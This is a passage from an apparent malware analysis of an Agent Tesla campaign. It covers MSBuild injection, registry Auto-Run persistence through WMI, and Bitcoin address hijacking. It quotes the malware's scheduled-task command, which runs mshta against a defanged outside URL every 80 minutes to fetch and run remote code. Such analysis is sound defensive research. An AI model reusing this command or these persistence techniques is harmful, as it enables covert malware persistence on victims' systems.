
This means Agent Tesla will run within “MSBuild.exe”—which is also a way to protect Agent Tesla from being detected by the victim.
I’ll explain the details of “WpfControlLibrary1.LOGO.Run()” later.
The VBScript code adds numerous items into the Auto-Run group in the system registry Figure 3.2 shows a screenshot of the Auto-Run group in the system registry of an infected system.
It creates a WMI (Windows Management Instrumentation) Object to add into the Auto-Run group by calling its function “SetStringValue()”.
Creates a scheduled task Besides adding items into the Auto-Run group, it adds a scheduled task in “Task Scheduler” to make the entire campaign work effectively.
Below is the code used to run “schtasks” to create a new scheduled task.
The new task name is “WIND0WSUPLATE”.
Its action is to execute command “mshta hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html” and it’s called every 80 minutes.
MicrosoftWINdows.run \"schtasks /create /sc
MINUTE /mo 80 /tn \\\"WIND0WSUPLATE\\\" /F /tr
\\\"MsHtA\\\" \\\"hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/ 27.html\\\"\" ,0 2.
Hijacking a Bitcoin address on the victim’s device After being decoded, we then obtained the second piece of VBScript code.
Executing it saves a batch of PowerShell code into the system registry under the subkey \"HKCU\\Software\\nasdnasndnad\".
It also adds an item to execute this PowerShell code into the Auto-Run group in the system registry, causing it to run at system startup (refer to the item “replcia” in Figure 3.2).